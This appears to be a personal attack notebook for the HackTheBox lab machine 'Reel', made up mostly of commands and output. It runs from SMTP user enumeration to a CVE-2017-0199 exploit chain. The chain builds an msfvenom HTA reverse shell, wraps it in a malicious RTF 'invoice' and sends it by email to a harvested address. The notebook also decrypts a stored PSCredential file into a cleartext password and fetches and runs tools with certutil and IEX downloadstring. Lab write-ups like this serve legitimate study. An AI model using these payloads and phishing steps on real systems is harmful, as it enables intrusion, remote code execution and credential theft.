export IP=10.129.1.151

### FTP
```bash
ftp $IP
```
exploit smtp with RTF object from readme.txt

`docx2txt AppLocker.docx`

### Get all ports
```bash
docker run -it --rm --name rustscan rustscan/rustscan:1.10.0 $IP
```

Open 10.129.1.151:22
Open 10.129.1.151:21
Open 10.129.1.151:25

### SMTP
##### SMTP user enumeration using RCPT and other commands
```bash
smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -t $IP
smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -t $IP
smtp-user-enum -M EXPN -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -t $IP

smtp-user-enum -M EXPN -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t $IP
smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t $IP
smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t $IP
```

Try User Enumeration using "RCPT TO". Replace <TARGET-DOMAIN> with the target's domain name:
```bash
hydra smtp-enum://10.129.1.151:25/rcpt -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -o "/home/alvin/Documents/OSCP-PWK/HackTheBox/Windows/Active Directory/Reel/results/10.129.1.151/scans/tcp25/tcp_25_smtp_user-enum_hydra_rcpt.txt" -p $IP
```

##### Nmap script
```bash
nmap --script smtp-enum-users $IP -v -p 25
```

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-enum-users: 
|   RCPT, root
|   RCPT, admin
|   RCPT, administrator
|   RCPT, webadmin
|   RCPT, sysadmin
|   RCPT, netadmin
|   RCPT, guest
|   RCPT, user
|   RCPT, web
|_  RCPT, test

```bash
nmap -p 25 --script smtp-brute $IP -Pn
```

### Back to the ftp documents as above failed
```bash
❯ mv Windows\ Event\ Forwarding.docx WEF.docx
                                                                                                                                                                                            
❯ docx2txt WEF.docx
Failed to extract required information from <WEF.docx>!
                                                                                                                                                                                            
❯ exiftool WEF.docx
```

nico@megabank.com

### RTF cve
##### without metasploit
0) Prepare the HTA payload with msfvenom
`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.13 LPORT=443 -f hta-psh > /tmp/alvin.hta` <- x86 make it harder to think about it.
1) Generate malicious RTF file
`python2 cve-2017-0199_toolkit.py -M gen -t RTF -w invoice.rtf -u http://10.10.16.13/alvin.hta`
2) serve it
```bash
cd /tmp 
python3 -m http.server 80
```
3) Start toolkit in exploit mode to deliver local payload <- This won't work since it need the target path to be executed.
```bash XX
python cve-2017-0199_toolkit.py -M exp -t RTF -e http://10.10.16.13/alvin.hta -l /tmp/alvin.hta
```
4) sendEmail
```bash
sendEmail -f foo@megabank.com -t nico@megabank.com -u "U hello" -m "M goodbye" -a invoice.rtf -s $IP -v
``` 

##### metasploit method 1 office_word_hta
##### metasploit method 2 meterpreter with Empire (offical writeup)

# Foothold
c:\Users\nico\Desktop>type cred.xml
type cred.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
https://hashes.com/en/tools/hash_identifier
https://hashcat.net/wiki/doku.php?id=example_hashes

```bash
hashcat -m 12900 --force -a 0 tom.hash /usr/share/wordlists/rockyou.txt
```

a little offset invest
01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692


000000000000000000000000000000000000000000000000000000038421854118412625768408160477112384218541184126257684081604771129b6258eb22fc8b9d08e04e6450f72b98725d7d4fcad6fb6aec4ac2a79d0c6ff738421854118412625768408160477112 

### PSCredential is the better way to do it
```c:\ rev
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
```
UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB

### RunAs or ssh
`ssh tom@$IP`

tom@REEL C:\Users\tom\Desktop\AD Audit>type note.txt
Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).
Maybe we should re-run Cypher query against other groups we've created.   

### Below follow the 0xdf writeup and ippsec video
```
certutil -urlcache -f http://10.10.16.13/SharpHound.exe SharpHound.exe 
certutil -urlcache -f http://10.10.16.13/SharpHound.exe SharpHound.ps1

PS>
IEX(New-Object Net.Webclient).downloadstring("http://10.10.16.13/SharpHound.ps1") Invoke-BloodHound -CollectionMethod All
```
BloodHound not working.

I'll just go with powerview.

certutil -urlcache -f http://10.10.16.13/powerview.ps1 powerview.ps1